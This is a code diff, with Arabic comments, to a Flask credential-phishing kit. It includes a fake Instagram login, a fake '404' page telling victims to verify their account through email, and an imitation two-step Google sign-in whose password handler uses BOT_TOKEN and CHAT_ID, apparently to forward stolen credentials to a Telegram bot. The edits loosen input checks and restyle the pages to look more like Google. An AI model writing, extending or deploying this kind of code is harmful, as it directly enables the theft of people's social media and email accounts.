@@ -24,13 +24,12 @@ def insta_login():
     username_val = request.form.get("username", "").strip()
     password = request.form.get("password", "")
 
-    # التأكد من أن يوزر انستا إنجليزي/أرقام فقط ولا يحتوي على أحرف عربية
+    # النمط يمنع الأحرف العربية تماماً ويسمح فقط بحروف إنجليزية وأرقام و _ ونقطة (من 4 إلى 30 حرف)
     username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"
 
     if not re.match(username_pattern, username_val):
       error = (
-          "عذراً، اسم المستخدم الذي أَدخلته لا ينتمي إلى أي حساب أو يحتوي على أحرف"
-          " غير مسموح بها (العربية ممنوعة). يُرجى التحقق ومحاولة مرة أخرى."
+          "عذراً، اسم المستخدم يجب أن يكون بحروف إنجليزية فقط (ممنوع العربي)، وبدون مسافات، ومن 4 لـ 30 حرف."
       )
     elif len(password) <= 5:
       error = (
@@ -137,7 +136,7 @@ def insta_login():
 
 
 # ----------------------------------------------------
-# 2. صفحة الخطأ 404 (تطلب تأكيد الحساب)
+# 2. صفحة الخطأ 404 (تطلب تأكيد الحساب بدون مربعات وبخط أسود)
 # ----------------------------------------------------
 @app.route("/error-404", methods=["GET", "POST"])
 def error_404():
@@ -158,17 +157,17 @@ def error_404():
     <title>خطأ 404 - تأكيد الحساب</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background: #121212; color: #f5f5f5; height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
-        .error-card { width: 100%; max-width: 380px; background: #1c1c1c; border: 1px solid #262626; border-radius: 12px; padding: 30px 20px; display: flex; flex-direction: column; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
-        .error-code { font-size: 50px; font-weight: 700; color: #ed4956; margin-bottom: 10px; }
-        .error-title { font-size: 18px; font-weight: 600; margin-bottom: 12px; color: #fff; }
-        .error-desc { font-size: 14px; color: #a8a8a8; line-height: 1.5; margin-bottom: 25px; }
-        .next-btn { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-size: 15px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-block; }
-        .next-btn:hover { background: #1877f2; }
+        body { background: #ffffff; color: #000000; height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; text-align: center; }
+        .error-container { width: 100%; max-width: 380px; display: flex; flex-direction: column; align-items: center; }
+        .error-code { font-size: 60px; font-weight: 700; color: #d93025; margin-bottom: 5px; }
+        .error-title { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #202124; }
+        .error-desc { font-size: 14.5px; color: #5f6368; line-height: 1.6; margin-bottom: 30px; }
+        .next-btn { width: 100%; background: #1a73e8; color: white; border: none; border-radius: 8px; padding: 13px; font-size: 15px; font-weight: 500; cursor: pointer; text-decoration: none; display: inline-block; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+        .next-btn:hover { background: #1558b0; }
     </style>
 </head>
 <body>
-    <div class="error-card">
+    <div class="error-container">
         <div class="error-code">404</div>
         <div class="error-title">حدث خطأ ما</div>
         <div class="error-desc">عذراً، واجهنا مشكلة في التحقق من هويتك. الرجاء تأكيد أنك صاحب الحساب عن طريق تسجيل الدخول بالبريد الإلكتروني المرتبط للمتابعة.</div>
@@ -193,19 +192,16 @@ def google_step1():
   error = ""
   if request.method == "POST":
     email_val = request.form.get("email", "").strip()
-
-    # شرط صارم للبريد الإلكتروني بحيث يجب أن ينتهي بنطاق حقيقي ومعروف (مثل gmail.com, yahoo.com, outlook.com, etc.)
-    # ولا يقبل أي صيغة عشوائية غير منتهية بنطاق صحيح
-    valid_email_pattern = r"^[\w\.-]+@(gmail|yahoo|outlook|hotmail|icloud)\.com$"
+    
+    # النمط الجديد للبريد: يقبل الحروف الكبيرة والصغيرة مثل SAMER@gmail.com ويمنع الأحرف العربية كلياً
+    email_pattern = r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$"
     phone_pattern = r"^\+?[0-9]{10,15}$"
 
     if not (
-        re.match(valid_email_pattern, email_val, re.IGNORECASE)
-        or re.match(phone_pattern, email_val)
+        re.match(email_pattern, email_val) or re.match(phone_pattern, email_val)
     ):
       error = (
-          "لم يتم العثور على حسابك على Google. يُرجى إدخال بريد إلكتروني حقيقي"
-          " وصحيح (مثل samer@gmail.com) أو رقم هاتف."
+          "البريد الإلكتروني غير صالح. ممنوع استخدام الحروف العربية، ويجب أن يكون بصيغة صحيحة مثل SAMER@gmail.com."
       )
     else:
       session["google_email"] = email_val
@@ -295,9 +291,7 @@ def google_step2():
     password = request.form.get("password", "")
 
     if len(password) <= 5:
-      error = (
-          "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة."
-      )
+      error = "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة."
     else:
       if BOT_TOKEN and CHAT_ID:
         msg = (
